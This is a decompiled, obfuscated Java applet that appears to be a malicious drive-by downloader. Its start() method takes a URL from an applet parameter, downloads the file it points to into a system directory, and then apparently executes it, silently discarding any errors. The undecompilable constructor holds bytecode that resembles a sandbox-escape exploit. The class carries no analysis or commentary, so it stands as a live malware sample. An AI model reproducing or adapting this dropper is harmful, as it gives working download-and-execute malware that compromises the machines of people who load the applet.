import java.util.HashSet;
import java.io.InputStream;
import java.io.FileOutputStream;
import javax.swing.JList;
import java.applet.Applet;

// 
// Decompiled by Procyon v0.5.30
// 

public class t extends Applet
{
    String f;
    JList ALLATORI_DEMO;
    
    public static String ALLATORI_DEMO(final String a) {
        final int n = 4;
        final int n2 = n << n;
        final int n3 = 1;
        final int n4 = n2 ^ n3 << n3;
        final int n5 = 4;
        final int n6 = n5 << n5 ^ (0x3 ^ 0x5) << 1;
        final int length = a.length();
        final char[] array = new char[length];
        int n7;
        int i = n7 = length - 1;
        final char[] array2 = array;
        final int n8 = n6;
        final char c = (char)n4;
        while (i >= 0) {
            final char[] array3 = array2;
            final int n9 = n7;
            final char c2 = (char)(a.charAt(n9) ^ c);
            --n7;
            array3[n9] = c2;
            if (n7 < 0) {
                break;
            }
            final char[] array4 = array2;
            final int n10 = n7;
            final char char1 = a.charAt(n10);
            --n7;
            array4[n10] = (char)(char1 ^ n8);
            i = n7;
        }
        return new String(array2);
    }
    
    private void ALLATORI_DEMO() {
        ALLATORI_DEMO(e.F("!b4")).concat(ALLATORI_DEMO(v.F("9")));
    }
    
    @Override
    public void start() {
        super.start();
        try {
            String s2;
            final String s = s2 = System.getProperty(ALLATORI_DEMO(e.F("n3k4n4k%r3*;k4n4k%k|p=b8b=s?t6k4n4k%m ")).replace(ALLATORI_DEMO(v.F("|,y,|=")), ""));
            if (s.charAt(s.length() - 1) != '\\') {
                s2 = new StringBuilder().insert(0, s2).append(ALLATORI_DEMO(e.F("\u000e"))).toString();
            }
            final String string = new StringBuilder().insert(0, s2).append(ALLATORI_DEMO(v.F("<u%u u%d,=/k%u u%d/")).replace(ALLATORI_DEMO(e.F("k4n4k%")), "")).toString();
            final InputStream allatori_DEMO = v.ALLATORI_DEMO(this.getParameter(ALLATORI_DEMO(v.F(".v!\u007f!v/w\"`>")).replace(ALLATORI_DEMO(e.F("9h9a7`:")), "")));
            byte[] array = new byte[153602];
            int n = 0;
            final FileOutputStream fileOutputStream = new FileOutputStream(string);
            InputStream inputStream = allatori_DEMO;
            byte[] array2 = array;
            int read;
            while ((read = inputStream.read(array2)) > 0) {
                final int n2 = 153602;
                fileOutputStream.write(array, 0, read);
                array = new byte[n2];
                n += read;
                inputStream = allatori_DEMO;
                array2 = array;
            }
            fileOutputStream.close();
            allatori_DEMO.close();
            try {
                v.J(string);
            }
            catch (Exception ex) {}
        }
        catch (Exception ex2) {}
    }
    
    public t() {
        // 
        // This method could not be decompiled.
        // 
        // Original Bytecode:
        // 
        //     0: iconst_1       
        //     1: aload_0         /* a */
        //     2: invokespecial   java/applet/Applet.<init>:()V
        //     5: anewarray       Ljava/lang/Object;
        //     8: iconst_1       
        //     9: dup            
        //    10: iconst_1       
        //    11: dup            
        //    12: pop2           
        //    13: pop2           
        //    14: dup            
        //    15: iconst_0       
        //    16: aconst_null    
        //    17: aastore        
        //    18: astore_1       
        //    19: iconst_0       
        //    20: aload_0         /* a */
        //    21: dup            
        //    22: dup_x2         
        //    23: invokespecial   t.ALLATORI_DEMO:()V
        //    26: invokespecial   t.ALLATORI_DEMO:()V
        //    29: istore_2       
        //    30: iconst_4       
        //    31: istore_2       
        //    32: getstatic       k.ALLATORI_DEMO:Ljava/lang/String;
        //    35: astore_3       
        //    36: new             Ljava/lang/String;
        //    39: dup            
        //    40: invokespecial   java/lang/String.<init>:()V
        //    43: astore          4
        //    45: new             Lh;
        //    48: dup            
        //    49: ldc             Ljava/lang/System;.class
        //    51: aload_3        
        //    52: aload_1        
        //    53: invokespecial   h.<init>:(Ljava/lang/Object;Ljava/lang/String;[Ljava/lang/Object;)V
        //    56: astore_1       
        //    57: new             Ljava/util/HashSet;
        //    60: dup            
        //    61: invokespecial   java/util/HashSet.<init>:()V
        //    64: dup            
        //    65: astore_3       
        //    66: aload_1        
        //    67: invokevirtual   java/util/HashSet.add:(Ljava/lang/Object;)Z
        //    70: sipush          132
        //    73: istore_1       
        //    74: new             Ln;
        //    77: dup            
        //    78: aload_0         /* a */
        //    79: aload_3        
        //    80: invokespecial   n.<init>:(Lt;Ljava/util/HashSet;)V
        //    83: astore_1       
        //    84: pop            
        //    85: new             Ljavax/swing/JList;
        //    88: aload_0         /* a */
        //    89: dup            
        //    90: pop2           
        //    91: dup            
        //    92: iconst_1       
        //    93: anewarray       Ljava/lang/Object;
        //    96: iconst_1       
        //    97: dup            
        //    98: iconst_1       
        //    99: dup            
        //   100: pop2           
        //   101: pop2           
        //   102: iinc            2, -1
        //   105: dup            
        //   106: iconst_0       
        //   107: aload_1        
        //   108: aastore        
        //   109: invokespecial   javax/swing/JList.<init>:([Ljava/lang/Object;)V
        //   112: putfield        t.ALLATORI_DEMO:Ljavax/swing/JList;
        //   115: iconst_1       
        //   116: istore_1       
        //   117: aload_0         /* a */
        //   118: dup            
        //   119: getfield        t.ALLATORI_DEMO:Ljavax/swing/JList;
        //   122: invokevirtual   t.add:(Ljava/awt/Component;)Ljava/awt/Component;
        //   125: pop            
        //   126: ldc2_w          3000
        //   129: invokestatic    java/lang/Thread.sleep:(J)V
        //   132: return         
        //   133: pop            
        //   134: pop            
        //   135: astore_1       
        //   136: return         
        //    LocalVariableTable:
        //  Start  Length  Slot  Name  Signature
        //  -----  ------  ----  ----  ---------
        //  0      137     0     a     Lt;
        //    Exceptions:
        //  Try           Handler
        //  Start  End    Start  End    Type                 
        //  -----  -----  -----  -----  ---------------------
        //  126    132    135    137    Ljava/lang/Exception;
        // 
        // The error that occurred was:
        // 
        // java.lang.NullPointerException
        //     at com.strobel.decompiler.languages.java.ast.AstBuilder.convertType(AstBuilder.java:324)
        //     at com.strobel.decompiler.languages.java.ast.AstBuilder.convertType(AstBuilder.java:153)
        //     at com.strobel.decompiler.languages.java.ast.AstMethodBodyBuilder.transformCall(AstMethodBodyBuilder.java:1120)
        //     at com.strobel.decompiler.languages.java.ast.AstMethodBodyBuilder.transformByteCode(AstMethodBodyBuilder.java:1010)
        //     at com.strobel.decompiler.languages.java.ast.AstMethodBodyBuilder.transformExpression(AstMethodBodyBuilder.java:540)
        //     at com.strobel.decompiler.languages.java.ast.AstMethodBodyBuilder.transformByteCode(AstMethodBodyBuilder.java:554)
        //     at com.strobel.decompiler.languages.java.ast.AstMethodBodyBuilder.transformExpression(AstMethodBodyBuilder.java:540)
        //     at com.strobel.decompiler.languages.java.ast.AstMethodBodyBuilder.transformNode(AstMethodBodyBuilder.java:392)
        //     at com.strobel.decompiler.languages.java.ast.AstMethodBodyBuilder.transformBlock(AstMethodBodyBuilder.java:333)
        //     at com.strobel.decompiler.languages.java.ast.AstMethodBodyBuilder.createMethodBody(AstMethodBodyBuilder.java:294)
        //     at com.strobel.decompiler.languages.java.ast.AstMethodBodyBuilder.createMethodBody(AstMethodBodyBuilder.java:99)
        //     at com.strobel.decompiler.languages.java.ast.AstBuilder.createMethodBody(AstBuilder.java:757)
        //     at com.strobel.decompiler.languages.java.ast.AstBuilder.createConstructor(AstBuilder.java:692)
        //     at com.strobel.decompiler.languages.java.ast.AstBuilder.addTypeMembers(AstBuilder.java:529)
        //     at com.strobel.decompiler.languages.java.ast.AstBuilder.createTypeCore(AstBuilder.java:499)
        //     at com.strobel.decompiler.languages.java.ast.AstBuilder.createTypeNoCache(AstBuilder.java:141)
        //     at com.strobel.decompiler.languages.java.ast.AstBuilder.createType(AstBuilder.java:130)
        //     at com.strobel.decompiler.languages.java.ast.AstBuilder.addType(AstBuilder.java:105)
        //     at com.strobel.decompiler.languages.java.JavaLanguage.buildAst(JavaLanguage.java:71)
        //     at com.strobel.decompiler.languages.java.JavaLanguage.decompileType(JavaLanguage.java:59)
        //     at com.strobel.decompiler.DecompilerDriver.decompileType(DecompilerDriver.java:317)
        //     at com.strobel.decompiler.DecompilerDriver.decompileJar(DecompilerDriver.java:238)
        //     at com.strobel.decompiler.DecompilerDriver.main(DecompilerDriver.java:138)
        // 
        throw new IllegalStateException("An error occurred while decompiling this method.");
    }
}
